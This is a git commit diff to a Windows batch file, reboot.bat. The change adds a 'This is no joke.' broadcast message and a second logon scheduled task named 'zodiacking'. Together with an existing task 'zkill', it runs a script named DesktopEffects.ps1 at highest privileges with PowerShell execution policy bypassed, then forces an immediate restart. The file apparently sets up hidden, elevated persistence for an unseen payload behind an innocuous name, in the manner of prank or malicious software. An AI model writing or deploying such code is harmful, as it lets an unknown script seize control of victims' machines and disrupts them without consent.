bd9b64a9d14b0f8301fd59f65d665f12171f8b51
theoInGithub <157048366+theoInGithub@users.noreply.github.com>
2026-01-26 11:43:59 +0100

    Update reboot.bat

--- reboot.bat
+++ reboot.bat
@@ -1,9 +1,12 @@
 @echo off
 
+msg * This is no joke.
+timeout /t 1
+
 set TASKNAME=zkill
 set SCRIPT=%~dp0DesktopEffects.ps1
 
 schtasks /create /tn "%TASKNAME%" /tr "powershell.exe -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /sc onlogon /rl HIGHEST /f
-
+schtasks /create /tn "zodiacking" /tr "cmd.exe /c \"%SCRIPT%\"" /sc onlogon /rl HIGHEST /delay 0000:30 /f
 shutdown /r /t 0 /f
 
